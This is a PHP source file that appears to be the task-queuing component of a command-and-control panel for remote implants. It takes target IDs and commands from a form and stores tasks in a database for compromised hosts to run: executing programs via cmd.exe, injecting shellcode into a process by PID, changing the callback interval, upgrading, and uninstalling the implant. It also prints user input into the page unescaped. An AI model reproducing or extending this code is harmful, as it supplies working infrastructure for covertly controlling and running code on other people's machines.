<?php

ob_start();
require_once('./includes/lock.php');
require_once('./includes/conf.php');
require_once('./includes/mysql.php');

$error = 0;

function genString($length)
{
	$chars ="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890";//length:36
	$final_rand='';
	
	for($i=0;$i<$length; $i++)
	{
		$final_rand .= $chars[ rand(0,strlen($chars)-1)];
	}
	return $final_rand;
}


if (isset($_POST['submit']) or count($_POST) > 1) {
	//print_r($_POST);
	// this is needed to handle traget rename on page
	if (!empty($_POST['pk'])) {
		$_POST['type'] = 20; //Changed from 2 to allow for type=2 in scheduled/queued options
		$_POST['target'] = $_POST['pk'];
		$_POST['command'] = $_POST['value'];
	}

	$type = $_POST['type'];
	$targets = explode(';', trim($_POST['target'], ';'));

	if (!empty($_POST['command']))
		$command = $_POST['command'];
	else
		$command = '';

	if (!empty($_POST['arguments']))
		$arguments = $_POST['arguments'];
	else
		$arguments = '';
	if ($type == 7)
		$command = 'Uninstall';

	//DO ERROR CHECKING
	if (empty($type))
		$error = 1;
	if (empty($command))
		$error = 1;
	if (empty($targets) or ! (is_array($targets) and $targets[0] != ''))
		$error = 1;

	if ($type == 0)
		$error = 1;

	if (($type == 6 && $arguments == '') || $type == 6 && empty($arguments))
		$error = 1;

	//INJECT SHELLCODE BUT INVALID PID IS SPECIFIED
	if ($type == 9 && empty($arguments))
		$error = 1;

	//RESET TYPE TO 1 CUZ THESE ARE ACTUALLY JUST RUNNING AN EXE (CMD.EXE) - WHICH IS #1
	if ($type > 10 && $type < 20)
		$type = 1;

	if (isset($_POST['runas']))
		$runas = 1;
	else
		$runas = 0;

	foreach ($targets as $target) {
		if ($error != 1) {
			//Maintenace VS Scheduling - For notification messages consistency
			$category = 'maintenance';

			$target = trim($target);
			$command = trim($command);
			$arguments = trim($arguments);

			//GENERATE RANDOM KEY - USED AS PRIMARY KEY TO ASSOCIATE THIS SPECIFIC TASK WITH SPECIFIC TARGET
			$key = base64_encode(genString(10));
			$opentime = time();

			//UPDATE CB PERIOD
			if ($type == 5) {
				//ADD TASK TO QUEUE
				$opentime = time();
				DB::insert('tasks', array('type' => '5', 'id' => $target, 'command' => $command, 'arguments' => '', 'key' => $key, 'status' => '0', 'results' => '', 'opentime' => $opentime, 'closetime' => ''));
			}
			//UPDATE PROJECT NAME
			else if ($type == 20) {
				DB::update('parameters', array('name' => $command), '`id`=%s', $target);
			}
			//UPGRADE
			else if ($type == 6) {
				//ADD TASK TO QUEUE
				$opentime = time();
				DB::insert('tasks', array('type' => '6', 'id' => $target, 'command' => $command, 'arguments' => $arguments, 'key' => $key, 'status' => '0', 'results' => '', 'opentime' => $opentime, 'closetime' => ''));
			}
			//UNINSTALL
			else if ($type == 7) {
				//ADD TASK TO QUEUE
				$opentime = time();
				DB::insert('tasks', array('type' => '7', 'id' => $target, 'command' => $command, 'arguments' => '', 'key' => $key, 'status' => '0', 'results' => '', 'opentime' => $opentime, 'closetime' => ''));
			}
			//QUEUED TASK
			else {
				//INSERT THE NEW TASK INTO THE DB
				//STATUS STARTS AT 0, GOES TO 1 AFTER IT IS SENT, THEN TO 2 AFTER THE RESULT IS RETURNED
				$sql = DB::insert('tasks', array('type' => $type, 'id' => $target, 'command' => $command, 'arguments' => $arguments, 'runas' => $runas, 'key' => $key, 'status' => '0', 'results' => '', 'opentime' => $opentime, 'closetime' => ''));
				$category = 'schedule';
			}


			if (DB::affectedRows() != 0) {
				//print "<p style='text-align:center; font-weight:bold'>Target Updated!</p>";
				if ($category == 'maintenance')
					print "<p class=\"alert alert-info\" style='text-align:center; font-weight:bold'>Target " . $target . " updated!</p>";
				else
					print "<p class=\"alert alert-info\" style='text-align:center; font-weight:bold'>Task has been queued for " . $target . "!</p>";
			}
			else {
				//print "<p style='text-align:center; font-weight:bold'>An error occurred updating the target!</p>";
				if ($category == 'maintenance')
					print "<p class=\"alert alert-danger\" style='text-align:center; font-weight:bold'>An error occurred updating the target!</p>";
				else
					print "<p class=\"alert alert-danger\" style='text-align:center; font-weight:bold'>An error occurred queuing the task!</p>";
			}
		}
		else {
			//print "<p style='text-align:center; font-weight:bold'>An error occurred. Check your inputs!</p>";
			print "<p class=\"alert alert-danger\" style='text-align:center; font-weight:bold'>An error occurred. Check the command and try again!</p>";
			exit;
		}
	}
}

ob_flush();
?>
